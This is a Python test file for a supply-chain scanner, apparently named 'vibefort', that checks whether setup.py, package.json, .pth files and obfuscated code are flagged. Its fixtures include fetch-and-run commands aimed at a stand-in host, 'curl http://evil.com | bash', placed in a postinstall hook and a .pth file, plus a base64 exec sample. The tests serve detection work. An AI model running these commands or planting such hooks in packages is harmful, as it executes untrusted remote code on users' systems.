from pathlib import Path
from vibefort.scanner.tier2 import scan_setup_py, scan_package_json, scan_for_pth_files, scan_for_obfuscation


def test_scan_setup_py_clean(tmp_path):
    setup = tmp_path / "setup.py"
    setup.write_text('from setuptools import setup\nsetup(name="clean")\n')
    assert scan_setup_py(setup) is None


def test_scan_setup_py_suspicious(tmp_path):
    setup = tmp_path / "setup.py"
    setup.write_text('import subprocess\nsubprocess.call(["curl", "http://evil.com"])\n')
    result = scan_setup_py(setup)
    assert result is not None


def test_scan_package_json_clean(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "clean", "version": "1.0.0"}')
    assert scan_package_json(pkg) is None


def test_scan_package_json_suspicious(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "evil", "scripts": {"postinstall": "curl http://evil.com | bash"}}')
    result = scan_package_json(pkg)
    assert result is not None


def test_scan_for_pth_malicious(tmp_path):
    pth = tmp_path / "evil.pth"
    pth.write_text("import os; os.system('curl http://evil.com | bash')")
    results = scan_for_pth_files(tmp_path)
    assert len(results) > 0


def test_scan_for_pth_clean(tmp_path):
    pth = tmp_path / "clean.pth"
    pth.write_text("/path/to/package\n")
    assert scan_for_pth_files(tmp_path) == []


def test_scan_for_obfuscation_base64(tmp_path):
    f = tmp_path / "payload.py"
    f.write_text('import base64; exec(base64.b64decode("aW1wb3J0IG9z"))')
    assert len(scan_for_obfuscation(tmp_path)) > 0


def test_scan_for_obfuscation_clean(tmp_path):
    f = tmp_path / "clean.py"
    f.write_text('print("hello world")\n')
    assert scan_for_obfuscation(tmp_path) == []
